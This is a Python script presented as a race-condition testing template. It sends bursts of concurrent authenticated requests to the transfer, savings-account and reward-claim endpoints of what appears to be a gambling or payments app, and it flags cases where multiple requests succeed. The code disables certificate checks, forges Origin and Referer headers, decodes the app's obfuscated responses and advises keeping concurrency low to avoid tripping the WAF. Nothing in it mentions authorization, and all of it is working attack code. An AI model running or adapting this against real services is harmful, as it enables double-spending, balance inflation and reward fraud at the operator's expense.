#!/usr/bin/env python3
"""竞态条件测试模板 - 并发请求测试资金操作API

使用方法:
1. 修改 TARGET 为目标URL
2. 修改 endpoints 列表为需要测试的API
3. 修改 payload 为实际请求数据
4. 运行: python3 race-condition-test.py

注意事项:
- 需要有效的认证Token才能测试需要认证的API
- 并发数不宜过高(5-10)，避免触发WAF
- 每次测试后等待几秒再进行下一轮
"""
import urllib.request
import json
import ssl
import threading
import time
import base64

# 配置
TARGET = "https://TARGET.com"
ssl_ctx = ssl.create_default_context()
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE

# 认证Token (需要先登录获取)
TOKEN = "YOUR_TOKEN_HERE"

# 测试结果
results = {"success": [], "error": [], "other": []}
lock = threading.Lock()

def decrypt(body):
    """解密反转+Base64响应"""
    try:
        return json.loads(base64.b64decode(body[::-1]).decode())
    except:
        return body[:200]

def send_request(endpoint, payload, idx):
    """发送单个请求"""
    try:
        data = json.dumps(payload).encode()
        req = urllib.request.Request(
            f"{TARGET}{endpoint}",
            data=data,
            headers={
                "Content-Type": "application/json",
                "User-Agent": f"Mozilla/5.0 (Thread-{idx})",
                "Token": TOKEN,
                "Origin": TARGET,
                "Referer": f"{TARGET}/m/#/home"
            }
        )
        resp = urllib.request.urlopen(req, timeout=10, context=ssl_ctx)
        body = resp.read().decode()
        result = decrypt(body)
        
        with lock:
            if isinstance(result, dict) and result.get("state") == "success":
                results["success"].append({"thread": idx, "result": result})
            else:
                results["error"].append({"thread": idx, "result": result})
    except Exception as e:
        with lock:
            results["other"].append({"thread": idx, "error": str(e)[:100]})

def test_race_condition(endpoint, payload, num_threads=10):
    """测试单个端点的竞态条件"""
    print(f"\n=== 测试: {endpoint} ===")
    print(f"并发数: {num_threads}")
    
    # 清空结果
    results["success"] = []
    results["error"] = []
    results["other"] = []
    
    # 创建并启动线程
    threads = []
    start = time.time()
    for i in range(num_threads):
        t = threading.Thread(target=send_request, args=(endpoint, payload, i))
        threads.append(t)
    
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    
    elapsed = time.time() - start
    
    # 输出结果
    print(f"耗时: {elapsed:.2f}s")
    print(f"成功: {len(results['success'])}")
    print(f"错误: {len(results['error'])}")
    print(f"异常: {len(results['other'])}")
    
    # 详细结果
    for r in results["success"][:3]:
        print(f"  ✅ Thread {r['thread']}: {json.dumps(r['result'], ensure_ascii=False)[:150]}")
    for r in results["error"][:3]:
        print(f"  ❌ Thread {r['thread']}: {json.dumps(r['result'], ensure_ascii=False)[:150]}")
    for r in results["other"][:3]:
        print(f"  ⚠️ Thread {r['thread']}: {r['error']}")
    
    # 判断是否存在竞态条件
    if len(results["success"]) > 1:
        print(f"\n🚨 疑似竞态条件! {len(results['success'])}个并发请求都成功了")
        return True
    
    return False

def main():
    """主测试流程"""
    # 测试用例列表
    test_cases = [
        {
            "name": "余额转账",
            "endpoint": "/api/User/TransferOperate",
            "payload": {
                "fromAcc": "my_wallet",
                "toAcc": "ag_live",
                "amount": "100",
                "password": "test"
            }
        },
        {
            "name": "余额宝转入",
            "endpoint": "/api/YuBao/UserAccoutBal2TrsAccountBal",
            "payload": {
                "amount": "100"
            }
        },
        {
            "name": "余额宝转出",
            "endpoint": "/api/YuBao/TrsAccountBal2UserAccoutBal",
            "payload": {
                "amount": "100"
            }
        },
        {
            "name": "签到领奖",
            "endpoint": "/api/Act/TasksReceive",
            "payload": {
                "taskId": "1"
            }
        }
    ]
    
    print("=" * 60)
    print("竞态条件测试")
    print(f"目标: {TARGET}")
    print("=" * 60)
    
    vulnerable = []
    for case in test_cases:
        print(f"\n{'='*40}")
        print(f"测试: {case['name']}")
        print(f"端点: {case['endpoint']}")
        if test_race_condition(case["endpoint"], case["payload"]):
            vulnerable.append(case["name"])
    
    print("\n" + "=" * 60)
    print("测试总结")
    print("=" * 60)
    if vulnerable:
        print(f"🚨 发现 {len(vulnerable)} 个疑似竞态条件漏洞:")
        for name in vulnerable:
            print(f"  - {name}")
    else:
        print("✅ 未发现竞态条件漏洞")

if __name__ == "__main__":
    main()
